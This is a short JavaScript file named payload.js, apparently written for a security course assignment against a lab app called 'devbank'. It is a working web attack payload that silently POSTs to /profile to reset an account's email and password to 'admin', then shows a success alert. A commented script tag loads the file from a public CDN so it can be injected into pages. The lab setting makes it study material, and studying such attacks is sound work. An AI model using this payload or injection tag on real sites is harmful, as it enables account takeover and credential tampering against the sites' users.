// payload.js
fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=admin@devbank.local&password=admin'
})
  .then(() => alert('SUCCESS! Password has changed to "admin".\nAccount modification submitted to /profile'))
  .catch(() => alert('Request failed to send'));
//<script src="https://cdn.jsdelivr.net/gh/ylaiAiden/FIT5003A2B2@<sha-256>/payload.js"></script>